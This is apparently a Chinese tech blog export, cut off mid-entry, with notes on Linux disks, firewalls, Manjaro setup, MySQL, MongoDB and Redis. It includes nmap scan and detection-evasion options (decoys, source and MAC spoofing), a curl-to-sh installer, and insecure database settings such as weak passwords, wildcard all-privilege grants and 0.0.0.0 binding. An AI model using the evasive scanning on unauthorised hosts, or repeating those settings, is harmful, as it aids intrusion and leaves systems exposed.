不保存直接退出===在确认创建一个主分区后，系统要求您先输入主分区的编号。我们在前文得知，主分区的编号范围是 1～4，因此这里输入默认的 1 就可以了.接下来系统会提示定义起始的扇区位置，这不需要改动，我们敲击回车键保留默认设置即可，系统会自动计算出最靠前的空闲扇区的位置。最后，系统会要求定义分区的结束扇区位置，这其实就是要去定义整个分区的大小是多少。我们不用去计算扇区的个数，只需要输入+2G 即可创建出一个容量为 2GB 的硬盘分区敲击参数 w 后回车，这样分区信息才是真正的写入成功啦===使用 file 命令查看该文件的属性,file /dev/sdb1可以输入 partprobe 命令手动将分区信息同步到内核，而且一般推荐连续两次执行该命令，效果会更好。如果使用这个命令都无法解决问题，那么就重启计算机吧partprobepartprobefile /dev/sdb1===mkfs如果硬件存储设备没有进行格式化，则 Linux 系统无法得知怎么在其上写入数据。因此，在对存储设备进行分区后还需要进行格式化操作。在 Linux 系统中用于格式化操作的命令是mkfs。这条命令很有意思，因为在 Shell 终端中输入 mkfs 名后再敲击两下用于补齐命令的 Tab键mkfs.文件类型名称#例如:要格式分区为 XFS 的文件系统 mkfs.xfs /dev/sdb1===挂载并使用存储设备步骤：首先是创建一个用于挂载设备的挂载点目录；然后使用 mount 命令将存储设备与挂载点进行关联；最后使用 df -h 命令来查看挂载状态和硬盘使用量信息。 mkdir /newFS mount /dev/sdb1 /newFS/ df -h du 命令 1234查看文件数据占用量格式为“du [选项] [文件]” du -sh /* 命令 来查看在 Linux 系统根目录下所有一级目录分别占用的空间大小 添加交换分区 123456789101112131415161718为了解决真实物理内存不足的问题 ,通过在硬盘中预先划分一定的空间，然后将把内存中暂时不常用的数据临时存放到硬盘中，以便腾出物理内存空间让更活跃的程序服务来使用的技术#交换分区的划分建议：在生产环境中，交换分区的大小一般为真实物理内存的 1.5～2 倍，为了让大家更明显地感受交换分区空间的变化，这里取出一个大小为 5GB 的主分区作为交换分区资源。在分区创建完毕后保存并退出即可：==SWAP 分区专用的格式化命令 mkswapmkswap /dev/sdb2使用 swapon 命令把准备好的 SWAP 分区设备正式挂载到系统中。swapon /dev/sdb5free -m 查看交换分区的大小变化vim /etc/fstab/dev/sdb2 swap swap defaults 0 0 磁盘容量配额 quota 123456789#介绍quota -- 限制每个人能够使用的磁盘容量inode 个数 isoft # 只是警告提醒，日志 ihard # 强制限制block 容量defaults xfs_uquota12#xfs_uquota -x -c &apos;limit bsoft=3m bhard=6m isoft=3 ihard=6 xps&apos; /boot edquota 修改配额1edquota xps 软硬方式链接 12345678910ln 命令格式为“ln [选项] 目标#参数-s 创建“符号链接”（如果不带-s 参数，则默认创建硬链接）-f 强制创建文件或目录的链接-i 覆盖前先询问-v 显示创建链接的过程#硬连接 -&gt; 源文件删除也没事 剖析ll文件参数信息 123456-rw-r--r--. 1 root root 813 Apr 15 2014 yum.conf. -&gt; facl +1 多少块813 占用实际大小 Apr 15 2014 最后修改文件的时间]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>rhel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptables与firewall]]></title>
    <url>%2Fiptables%E4%B8%8Efirewall%E9%98%B2%E7%81%AB%E5%A2%99%2F</url>
    <content type="text"><![CDATA[iptables与firewall防火墙 配置网卡文件 修改配置文件 12345678910111213141516171819vim /etc/sysconfig/network-scripts/ifcfg-eno16777736#文件内容如下HWADDR=&quot;00:0C:29:C2:F1:76&quot;TYPE=&quot;Ethernet&quot; #类型BOOTPROTO=&quot;dhcp&quot;DEFROUTE=&quot;yes&quot;PEERDNS=&quot;yes&quot;PEERROUTES=&quot;yes&quot;IPV4_FAILURE_FATAL=&quot;no&quot;IPV6INIT=&quot;yes&quot;IPV6_AUTOCONF=&quot;yes&quot;IPV6_DEFROUTE=&quot;yes&quot;IPV6_PEERDNS=&quot;yes&quot;IPV6_PEERROUTES=&quot;yes&quot;IPV6_FAILURE_FATAL=&quot;no&quot;NAME=&quot;eno16777736&quot;UUID=&quot;af3aaad5-b615-493c-872e-76503b9adad5&quot; #唯一标识ONBOOT=&quot;yes&quot; #开机自启 基于图形界面配置网卡 nmtuio 123 nmtuio systemctl restart network nm-connection-editor工具 1nm-connection-editor 图形界面点击右上角 配置防火墙规则： 自上而下做匹配几种状态123accept 允许流量通过reject 明确拒绝drop 对方不知道你是否在线(显示超时) iptables 1234567891011121314151617181920212223242526272829比较老,逐渐被取代基于命令行难度最高iptables -L #显示所有的策略iptables -F #清空所有策略iptables -P INPUT DROP #默认禁止所有流量策略,不能reject-I #插入到最前面-A #插入到最后面-p # 允许的协议--dport #本机端口-s #来源-j #本身为意义，后面跟动作iptables -I INPUT -p icmp -j ACCEPT #只允许外部到内部的pingiptables -I INPUT -s 192.168.10.0/24 -p tcp --dport 22 #允许来自某个网段的访问，端口为22-D #删除某一条iptables -D INPUT 1 #删除第一条iptables -I INPUT -p tcp --port 22 -j REJECT #禁止外部所有22端口的流量iptables -I INPUT -p tcp --port 22:200 -j REJECT #禁止外部所有20到200端口的流量service iptables save firewalld 防火墙(分为下面两个)123zone 区域sbit 安全位public 默认策略,当前使用 firewall-cmd 命令行 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849Runtime 当前生效，重启后失效Premanent 当前暂时不生效，但是永久生效--premanent # 建议添加这个firewall-cmd -reload #重启firewall-cmd --get-default-zone #查看当前区域firewall-cmd --set-default-zone=drop #切换默认区域到丢包firewall-cmd --permanent --zone=drop --change-interface=en0167777 #重启之后，把这个网卡区域换为dropfirewall-cmd --permanent get-zone-of-interface=en0167777 #重启之后，查看紧急模式firewall-cmd --panic-on #切断所有网络连接，包括ping的数据包firewall-cmd --panic-off #关闭紧急模式查询服务firewall-cmd --zone=public --query-service=http #查看是否允许httpfirewall-cmd --zone=public --query-service=ssh添加允许服务firewall-cmd --zone=public --add-servcice=http #允许从外访问http服务firewall-cmd --zone=public --add-servcice=https #重启才可以 firewall-cmd --reloadfirewall-cmd --zone=public --add-servcice=https禁止服务firewall-cmd --zone=public --remove-servcice=httpsfirewall-cmd --permanent --zone=public --add-servcice=httpsfirewall-cmd --permanent --zone=public --query-servcice=https 添加端口号firewall-cmd --zone=public --add-port=8080/tcp #把这个端口添加到ctp协议组，允许firewall-cmd --zone=public --add-port=80-90/tcp #端口端端口转发（隐藏原始端口）firewall-cmd --permanent --zone=public --add-forward-port=888:porto:tcp:toport=22:toaddr=192.168.10.10 #转发888到22firewall-cmd --reload富规则（复规则）精准匹配firewall-cmd --permanent --zone=public --add-rich-rule=&quot;rule family&quot;=&quot;ipv4&quot; source address=&quot;192.168.10.0/24&quot; service name=&quot;ssh&quot; reject&quot;firewall-cmd reload firewall-config 图形化 12firewall-config TCP Wrappers 123456789101112（优先级：先匹配允许，再匹配拒绝）/etc/hosts.allow #白名单 允许服务名称、IP地址/etc/hosts.deny #黑名单 拒绝服务名称、IP地址白名单(编辑后就生效)sshd:192.168.10.0/24 #允许这个网段的主机访问黑名单(编辑后就生效)sshd:192.168.10.* # 所有主机，通配符 1.2.3. 数据链路层（协议，端口号，来访IP地址） 应用层（服务名称） 四个工具，只要有一个把他禁止，就禁止了！]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>防火墙</tag>
        <tag>rhel</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Manjaro 安装之后 基本配置]]></title>
    <url>%2FManjaro%20%E5%AE%89%E8%A3%85%E4%B9%8B%E5%90%8E%20%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[Manjaro 安装之后 基本配置配置国内源 1sudo pacman-mirrors -i -c China -m rank #弹出来框，我选择的清华的源 升级系统 1sudo pacman -Syy &amp;&amp; sudo pacam -Syyu 安装vim 1sudo pacman -S vim 添加arch源 12sudo vim /etc/pacman.conf#在文件末尾添加，我添加的清华的 安装archlinuxcn签名钥匙(导入 GPG key，否则的话key验证失败会导致无法安装软件) 1sudo pacman -Syy &amp;&amp; sudo pacman -S archlinuxcn-keyring 安装网络工具包，ifconfig等 12pacman -S net-tools dnsutils inetutils iproute2 安装sogou拼音输入法 123sudo pacman -S fcitx-im # 安装fcitx 选择全部安装sudo pacman -S fcitx-configtool # fcitx 配置界面sudo pacman -S fcitx-sogoupinyin # 安装sogoupinyin 设置中文输入法环境变量，编辑~/.xprofile文件，增加下面几行(如果文件不存在，则新建) 重启后生效 12345sudo vim ~/.xprofile # 打开编辑.xprofile文件# 在文件中加入以下两行代码export GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport XMODIFIERS="@im=fcitx" 安装Google-Chrome浏览器 1sudo pacman -S google-chrome 安装网易云音乐 1sudo pacman -S netease-cloud-music 安装git (默认貌似就已经存在了) 1sudo pacman -S git 安装wps，及其字体 12$ sudo pacman -S wps-office # 安装wps$ sudo pacman -S ttf-wps-fonts # 安装wps字体 配置wps，使wps可以输入中文 12345$ sudo vim /usr/bin/wps # 编辑wps配置文件# 在 紧跟#!/bin/bash后添加下列三行export GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport XMODIFIERS=&quot;@im=fcitx&quot; 注销后再次登录输入法生效。 安装Shadowsocks-qt5，实现科学上网（我还是一会安ssr吧，在文章最底下） 1sudo pacman -S shadowsocks-qt5 安装VSCode 1sudo pacman -S visual-studio-code-bin # 安装VSCode和云音乐等等，都需archlinuxcn源 安装markdown编辑器 1sudo pacman -S typora 配置jdk环境变量 1234567# 配置环境变量# sudo vim /etc/profile #编辑文件# 在文件末尾处追加下列几行export JAVA_HOME=你的jdk解压后的绝对路径 export JRE_HOME=$&#123;JAVA_HOME&#125;/jre export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH 安装终端显示信息neofetch(装b神器,安装screenfetch也可) 1sudo pacman -S neofetch 安装Tim,微信 (KDE桌面无法使用) 1sudo pacman -S deepin.com.qq.office deepin.com.wechat 配置微信，tim的中文输入问题 (KDE桌面无法使用) Tim启动脚本位置：/opt/deepinwine/apps/Deepin-TIM/run.sh WeChat启动脚本位置：/opt/deepinwine/apps/Deepin-WeChat/run.sh # 1 配置tim中文，打开tim启动脚本文件 （微信同理） 1sudo vim /opt/deepinwine/apps/Deepin-TIM/run.sh 在启动脚本命令之前添加以下内容 123export GTK_IM_MODULE=fcitxexport QT_IM_MODULE=fcitxexport XMODIFIERS=&quot;@im=fcitx&quot; 安装Deepin Terminal(终端)，安装完成之后，自行在deepin-terminal更改显示字体 1sudo pacman -S deepin-terminal 安装有道词典 1sudo pacman -S youdao-dict 安装vokoscreen录屏 1sudo pacman -S vokoscreen 安装MariaDb代替mysql(MyriaDb与Mysql相互兼容) 12345678$ sudo pacman -S mariadb mariadb-clients# 安装成功后，根据提示，输入下列指令初始化MariaDb数据库$ sudo mysql_install_db --user=mysql --basedir=/usr --datadir=/var/lib/mysql# 一番信息自动输出完成后，执行以下代码$ sudo systemctl start mysqld # 启动MariaDb$ mysqladmin -u root password &quot;root&quot; # 为root、用户添加密码$ sudo systemctl enable mysqld # 设置mariaDb开机自启$ mysql -uroot -p # 输入设置的的密码，登录数据库 安装配置oh my zsh(听说是bash的升级版，装*专用，我就先不弄了) 123$ sudo pacman -S zsh$ sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot; # 下载并配置ohmyzsh$ chsh -s /bin/zsh #更换默认bash，重启后生效 卸载Manjaro自带的一些没用的软件 卸载之后就可以更新一下软件了 1sudo pacman -Syyu pacman基本命令更新软件 123456sudo pacman -Su # 更新已安装软件sudo pacman -Syu #更新软件前检查包列表是否最新sudo pacman -Syyu #更新前强制下载包列表 查找软件 1sudo pacman -Ss packge_name 安装指定的包 1pacman -S package_name1 package_name2 ... 安装包组 一些包属于一个可以同时安装的软件包组，例如： 1pacman -S gnome 想要查看哪些包属于 gnome 组，运行： 1pacman -Sg gnome 删除软件包 1.删除单个软件包，保留其全部已经安装的依赖关系 1pacman -R package_name 2.除指定软件包，及其所有没有被其他已安装软件包使用的依赖关系： 1pacman -Rs package_name 3.要删除软件包和所有依赖这个软件包的程序 1pacman -Rns package_name 4.要删除软件包，但是不删除依赖这个软件包的其他程序： 1pacman -Rdd package_name 5.pacman 删除某些程序时会备份重要配置文件，在其后面加上*.pacsave扩展名。-n 选项可以避免备份这些文件： 1pacman -Rn package_name1 ​ 注意: pacman 不会删除软件自己创建的文件(例如主目录中的 .dot 文件不会被删除。 清理软件包缓存 pacman 将下载的软件包保存在 /var/cache/pacman/pkg/ 并且不会自动移除旧的和未安装版本的软件包，因此需要手动清理，以免该文件夹过于庞大。 使用内建选项即可清除未安装软件包的缓存： 1pacman -Sc 警告:仅在确定当前安装的软件包足够稳定且不需要降级时才执行清理。 pacman -Sc仅会保留软件包的当前有效版本，旧版本的软件包被清理后，只能从其他地方如 Arch Linux Archive (简体中文)中获取了。 pacman -Scc 可以清理所有缓存，但这样 pacman 在重装软件包时就只能重新下载了。除非空间不足，否则不应这么做。 更新源自动：自动设置最快的源 12sudo pacman-mirrors -gsudo pacman -Syyu 手动：选择源：sudo pacman-mirrors -i同样要强制更新包 重置为自动选择： 1sudo pacman-mirrors -g -c all 切换testing分支 12sudo pacman-mirrors -g -b testingsudo pacman -Syyu 退回稳定版 123sudo pacman-mirrors -g -b stablesudo pacman -Syyuusudo pacman-mirrors -i -c China -m rank 清理垃圾清除系统中无用的包 1sudo pacman -R $(pacman -Qdtq) 清除已下载的安装包 1sudo pacman -Scc 日志垃圾查看日志文件 1du -t 100M /var 或 1journalctl --disk-usage 删除指定大小日志文件 1sudo journalctl --vacuum-size=50M 安装ssr步骤： 安装git命令，用 1git clone -b manyuser https://github.com/shadowsocksrr/shadowsocksr.git 下载shadowsockssr。 进入shadowshocksr目录 运行如下命令：./initcfg.sh 运行如下命令编写user-config.json配置文件sudo nano user-config.json 将ssr服务器的配置填写到配置文件中 进入shadowsocks目录cd shadowsocks./local.py 代理客户端已经开始运行 设置浏览器代理：以firefox为例， 从 https://addons.mozilla.org/zh-CN/firefox/addon/foxyproxy-standard/?src=search 添加foxyproxy-standard插件左键点击插件图标 选 “options” – “add” – “socks5”填写代理的名称（随便写），IP（127.0.0.1），端口（1080）]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Manjaro</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nmap参数简介]]></title>
    <url>%2Fnmap%E5%8F%82%E6%95%B0%2F</url>
    <content type="text"><![CDATA[新学一个抓包工具 -&gt; tcpump123456tcpdmp -i eth0 -nn host 192.168.1.56 port 22 # 用nc连nc 192.168.1.56 -t 22# 点. 就是ack的意思 主机发现1234567891011121314-iL # 指定文件-iR 100 -p22 # 随机选择目标100个 的22端口 nmap 192.168.0.0/24 --exclude 192.168.0.1-100 # 不扫描后面的部分-sL # 列出ip（相当于子网掩码的计算）-sN # 只ping-Pn #不做ping扫描，例如针对防火墙等安全产品， 防止：如果没有回包就不进行了 -PS/PA/PU/PY # 用syn，ack，udp， sctp 发现-PE/PP/PM # 用echo， 时间戳，子网掩码 （一般没啥结果）-PO # ip协议的ping-n/ -R # 不做dns解析 / 做反向的解析--dns-servers # 调用指定的dns服务器--system-dns # 操作系统默认的dns，一般不用--traceroute # 过程中进行raceroute 端口发现123456789101112131415-sS/sT/sA/sW/sM # 默认的 syn扫描/tcp扫描,建立完整连接(最准确)/发送ack / 窗口扫描 / ack+fn-sU # udp扫描（准确性不怎么高）-sN/sF/sX # tcp的flag全为空 /只有fin/ fin,psh,urg--scanflag # 自定义flag （自己得懂原理）-sI # 僵尸扫描-sY/sZ # sctp用 -sO # ip扫描-b # ip中继--p # 指定端口(tcp与udp都扫), U: 53 -T:21 (分别指定tcp与udp的端口) 默认1000个--exclude-ports # 指定端口中某一段-F # 快速扫描(不会扫描100个全部端口)-r # 连续扫描(顺序)--top-ports # 扫排名前10个--port-radio # 扫描更常见的端口(用处不大) 服务扫描12345-sV # 扫描这个端口跑的什么服务--version-intensity # 0-9的扫描程度，9最详细--version-light # 上面的等于2时--version-all # 上面的等于9时--version-trace # 将扫描过程进行跟踪 脚本扫描 （脚本目录:/usr/share/nmap/scripts/）1234567-sC # 默认--script=... # 指定脚本--script-args= # 带参数--script-args-file= --script-trace # 也可以trace--script-updatedb # 更新脚本 nmap --script-updatedb--script-help # 查看脚本的帮助 操作系统类型123-O # 操作系统类型--osscan-limit # 限制检测的系统类型--osscan-guess 时间和性能12345678910-T # 指定间隔时间-min-hostgroup/ -max-hostgroup # 最少一次扫描的主机数量 组--min-parallelism/ --max-parallelism # 最少一次扫描的主机数量--min-rtt-timeout/ --max-rtt-timeout/ --initial-rtt-timeout # 最小最大rtt--max-retries #--host-timeout # 超时时间--scan-delay/ --max-scan-delay 10s # 延时时间(防止被发现)--min-rate # 发包最小速率--max-rate 防火墙 和躲避12345678910111213-f # 最大传输mtu值 1500啥的-D 192.168.0.2 192.168.0.3 192.168.0.4 # 伪造原地址(迷惑)-S # 伪造源地址-e # 指定网卡-g # 指定使用的源端口--proxies &lt;url1, [url2]&gt; # 置地广代理服务器替我们发包 --data # 数据字段指定内容(必须是16进制)--data-string--data-length--ip-options--ttl--spoof-mac # 欺骗mac地址--badsum # 发错的差错校验值 输出格式1-oN / -oX / -oS /-oG # 正常格式/xml格式/../../ 杂项12-6 # ipv6的-A # 几个参数的组合（涵盖：-v, -O, --script, --trace） # trace路由追踪]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>nmap</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[远程连接mysql]]></title>
    <url>%2F%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5MySQL%2F</url>
    <content type="text"><![CDATA[远程连接MySQL想要远程连接MySQL 那么必须是普通用户才行 不能是 root 用户 所以我们要先创建一个普通用户 创建普通用户 1CREATE USER &apos;username&apos;@&apos;%&apos; IDENTIFIED BY &apos;password&apos;; 给普通用户赋权 1GRANT ALL ON *.* TO &apos;username&apos;@&apos;%&apos; 刷新系统权限相关表 1FLUSH PRIVILEGES 以上三步执行的 创建用户 –&gt; 给创建的用户赋权 –&gt; 刷新 这样的话 可能还是不能完成MySQL的一个远程连接 这时候需要改变MySQL的一个默认配置 这配置文件位于/etc/mysql/mysql.conf.d/下的mysqld.cnf 里面有找到bind-address 把值127.0.0.1改为0.0.0.0然后接下来就是远程连接了 改完要记得重启MySQL服务 接下来就是远程连接MySQL首先要保证自己电脑装了MySQL才能远程连接1mysql -u username -p password -h ip地址 -P 端口号（一般默认是3306） 如果想要远程连接 首先要保证 本地安装了MySQL 才能远程连接]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mysql，数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql创建新用户并分配权限]]></title>
    <url>%2FMySQL%E6%B7%BB%E5%8A%A0%E6%96%B0%E7%94%A8%E6%88%B7%E3%80%81%E4%B8%BA%E6%96%B0%E7%94%A8%E6%88%B7%E5%88%86%E9%85%8D%E6%9D%83%E9%99%90%2F</url>
    <content type="text"><![CDATA[1、使用root用户登录mysql 2、添加具有本地(localhost/127.0.0.1)访问权限的用户 1create user &apos;newuser&apos;@&apos;localhost&apos; identified by &apos;password&apos;; 3、创建具有远程访问权限的用户 1create user &apos;newuser&apos;@&apos;%&apos; identified by &apos;password&apos;; 创建之后记得执行下面指令更新权限：1flush privileges; 3、为新用户分配本地权限，可以指定数据库dbname和表名，可以用*替指所有。 1grant all privileges on `dbname`.* to &apos;newuser&apos;@&apos;localhost&apos; identified by &apos;password&apos;; 4、为新用户分配远程权限，可以指定数据库dbname和表名，可以用*替指所有。1grant all privileges on `dbname`.* to &apos;newuser&apos;@&apos;%&apos; identified by &apos;password&apos;; 分配所有权限1&gt; grant all privileges on *.* to &apos;test&apos;@&apos;%&apos; identified by &apos;123456&apos; 分配好之后之后记得执行下面指令更新权限：1flush privileges; 5、如果还有问题，可以使用root账号登陆上去查询一下，再看看有没问题。1use mysql 6、查看user表1select Host, User, Password from user;]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mysql表结构复制]]></title>
    <url>%2Fmysql%20%E8%A1%A8%E7%BB%93%E6%9E%84%E7%9A%84%E5%A4%8D%E5%88%B6%2F</url>
    <content type="text"><![CDATA[复制结构：仿照student表结构复制一张new_student表,新表是空的： 1create table new_student like student; 复制数据：但是没主键，结构不重要： 1234create table new_student2 as( select * from student); 复制表结构与数据，一模一样：1insert into new_student3 select * from student;]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mysql，数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu彻底卸载mysql并且重新安装]]></title>
    <url>%2Fubuntu%E5%BD%BB%E5%BA%95%E5%8D%B8%E8%BD%BDmysql%E5%B9%B6%E4%B8%94%E9%87%8D%E6%96%B0%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[首先删除mysql: 1sudo apt-get remove mysql-* 然后清理残留的数据 1dpkg -l |grep ^rc|awk &apos;&#123;print $2&#125;&apos; |sudo xargs dpkg -P 它会跳出一个对话框，你选择yes就好了然后安装mysql 1sudo apt-get install mysql-client mysql-server 安装的时候会提示要设置root密码，如果你没有在卸载的时候去清理残留数据是不会提示你去设置root密码的检查mysql是不是在运行 1sudo service mysql status 一般安装完成之后都是会自动运行的。如果没有运行你可以 1sudo service mysql start 查看端口1sudo netstat -tap | grep mysql 运行它]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装mysql竟然没让你输入密码]]></title>
    <url>%2F%E5%AE%89%E8%A3%85Mysql%E7%AB%9F%E7%84%B6%E6%B2%A1%E6%9C%89%E6%8F%90%E7%A4%BA%E4%BD%A0%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[Mysql5.7这个版本的root密码在/etc/mysql/debian.cnf这个文件里面 使用sudo cat /etc/mysql/debian.cnf命令打开，你大概会看到如下内容，其中就包括Mysql的默认登陆名与密码 12345678910[client]host = localhostuser = debian-sys-maintpassword = M1WVft5X8S80rhE0socket = /var/run/mysqld/mysqld.sock[mysql_upgrade]host = localhostuser = debian-sys-maintpassword = M1WVft5X8S80rhE0socket = /var/run/mysqld/mysqld.sock 1、使用 mysql -u用户名 -p密码进行登陆， 1mysql -udebian-sys-maint -pM1WVft5X8S80rhE0 2、修改root用户密码 123456show databases；use mysql;update user set authentication_string=PASSWORD(&quot;密码&quot;) where user=&apos;root&apos;;update user set plugin=&quot;mysql_native_password&quot;;flush privileges;quit; 注:由于mysql5.7没有password字段，密码存储在authentication_string字段中 3、重新启动Mysql 1/etc/init.d/mysql restart 4、再次使用root用户登陆 1登陆成功]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB简单的curd]]></title>
    <url>%2FMongoDB%E7%AC%94%E8%AE%B0%E4%B9%8B%E7%AE%80%E5%8D%95%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5%2F</url>
    <content type="text"><![CDATA[## 集合创建： 1234db.createCollection(&quot;test_col,&quot;,&#123;capped:true, size:10&#125;)# &quot;test_col&quot; 表名字(集合名字)# capped， 默认false，不设置上限，true设置上限 查看当前数据库的集合：1show collections 删除集合：1db.集合名称.drop() 查询：12345678# 查找集合中所有的数据db.collection_name.find() # 查询文档# pretty() 方法以格式化的方式来显示所有文档 美观db.collection_name.find().pretty()# 指定_id查找db.collection_name.find(&#123;_id:1&#125;).pretty() _id： 如果插入数据不给定id，他会自动创建，可以通过id查找文档 插入：12345# 向集合插入文档db.collection_name.insert(document)例子：db.col_test.insert(&#123;name:&apos;xx&apos;, gender:&apos;nan&apos;&#125;)（在集合不创建的时候也可以，集合会自动被创建） 更新：12345678910db.collection_name.update(&#123;&#125;) # 更新文档db.collection_name.update(&#123;&apos;count&apos;:88&#125;,&#123;$set:&#123;&apos;count&apos;:89&#125;&#125;)# count 由88变成89，只会作用于第一条数据例子：db.集合名称.update(&#123;name:&apos;xx&apos;&#125;, &#123;$set:&#123;&apos;name&apos;:&apos;xps&apos;&#125;&#125;, &#123;multi:true&#125;)将name为xx的改为yy， multi多行，默认false，只作用于第一个，为true时修改多条# 更新多行，这个3.2的版本才支持db.col_name.updateMany() 删除：12345678910db.collection_name.remove(&#123;&#125;) # 删除集合所有文档 全部删除db.集合名称.remove(&#123;gender:&apos;nan&apos;, &#123;justone:true&#125;&#125;) # 依据条件删除一条justone默认false，删除多条#删除多条3.2版本才有db.col_name.deleteMany()# 删除集合db.col_name.drop() 保存 （如果集合不存在，则执行添加操作）1db.集合名称.save(document) 数据类型object ID 文档ID （不会重复，12字节的16进制数） String 字符串 Boolean 存储一个布尔值 Integer 整数 Double 浮点值 Arrays 数组或列表 Object 用于嵌入式的文档，即一个值为一个文档 Null 存储NUll值 Times tamp 时间戳 Data 当前日期活时间的UNIX时间格式 object ID ： （不会重复，12字节的16进制数，前4当前时间，…)]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis基础]]></title>
    <url>%2Fredis%E8%A1%A5%E5%85%85%2F</url>
    <content type="text"><![CDATA[在Ubuntu系统中默认配置文件地址: 1/etc/redis/redis.conf 1234port6379 # 默认端口 logfile /var/log/redis.log # 日志文件位置 dbfilename dump.rdb # RDB持久化数据文件 bind 0.0.0.0 # 指定IP进行监听 组成部分： 服务端: Redis-service 客户端: Redis-cli 1234# 进入数据库redis-cli# 退出exit 基本数据类型： String:字符串 Hash:哈希 List:列表 Set:集合 Sorted set:有序集合 12# 查看帮助help @sorted_set String:字符串string是redis最基本的类型，一个key对应一个value。 123456789101112131415161718192021222324252627282930313233# 设置值SET key value# 得到值GET key# 将key的值设置为新的，并返回旧的值GETSET key value_new# 设置多个键值MSET name xps sex nan#取出多个键的值MGET name sex# 获取key的值的长度STRLEN name# 将该值追加到name的值xps的后面APPEND name ppp# 设置持续时间SETEX name 10 xps# 如果该key有值就不执行SET name xxx# 每次执行将value的数字加1set age 10INCR age# 每次执行将value的数字减1DECR age 全局Key操作：12345keys * # 查看所有的键DEL keyEXISTS keyRENAME old_key new_keyTYPE key Hash:哈希（字段里面也有值）Hashes类型看成具有String Key和String Value的map容器。 123456类似于这种结构：b = &#123; one:xps two:xp three:x&#125; 123456789101112131415161718# 设置该key字段的值HSET key field valueHSET b one xpsHSET b one xps two xp three x# 获取该key字段的值HGET key fieldHGET b one# 获取hash表里面所有的值HVALS keyHvals b# 获取hash表里面所有的字段Hkeys b# 获取hash表中的字段数量HLEN b List类型（例如：微博评论）List类型是按照插入顺序排序的字符串链表。在插入时，如果该键并不存在，Redis将为该键创建一个新的链表 123456789101112131415161718192021# 向列表头部插入数据（顺序：c,b,a）LPUSH names a b c# 插入数据（x,y,z）RPUSh names2 x y z# 获取列表里面某个索引对应的值LINDEX key indexLINDEX names 0# 弹出并删除最后一个元素RPOP names# 弹出并删除最前面一个元素LPOP names# 列表的长度LLEN key#LSET key index value Set类型(微博粉丝，关注人)Set类型没有排序的字符集合。如果多次添加相同元素，Set中将仅保留该元素的一份拷贝。 1234567891011121314151617# 向集合添加成员SADD setkey a b c d # 查看集合成员数量SCARD key# 迭代集合中的所有元素SMEMBERS keySMEMBERS setkey# 判断集合是否存在该元素(存在为1，不存在为0)SMEMBERS key valueSMEMBERS setkey aSMEMBERS setkey z #删除并返回集合中的一个随机元素 SPOP setkey Sorted Set类型（排行榜，top,直播）每一个成员都会有一个分数(score)(权重)与之关联。成员是唯一的，但是分数(score)却是可以重复的。 123456789101112131415# 向有序集合添加成员，并且给他权重ZADD key score1 member1 [score2 member2]ZADD akey 1 a 2 b 3 c# 显示集合成员数ZCARD zkey# 计算有序集合指定区的分数的成员数ZCOUNT zkey 1 3# 移除有序集合一个或多个成员ZREM zkey number# 查找 迭代有序集合所有元素ZSCAN zkeys ###]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis常用命令]]></title>
    <url>%2Fredis%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[在Ubuntu系统中默认配置文件地址: 1/etc/redis/redis.conf 1234port6379 # 默认端口 logfile /var/log/redis.log # 日志文件位置 dbfilename dump.rdb # RDB持久化数据文件 bind 0.0.0.0 # 指定IP进行监听 组成部分： 服务端: Redis-service 客户端: Redis-cli 1234# 进入数据库redis-cli# 退出exit 基本数据类型： String:字符串 Hash:哈希 List:列表 Set:集合 Sorted set:有序集合 12# 查看帮助help @sorted_set String:字符串string是redis最基本的类型，一个key对应一个value。 123456789101112131415161718192021222324252627282930313233# 设置值SET key value# 得到值GET key# 将key的值设置为新的，并返回旧的值GETSET key value_new# 设置多个键值MSET name xps sex nan#取出多个键的值MGET name sex# 获取key的值的长度STRLEN name# 将该值追加到name的值xps的后面APPEND name ppp# 设置持续时间SETEX name 10 xps# 如果该key有值就不执行SET name xxx# 每次执行将value的数字加1set age 10INCR age# 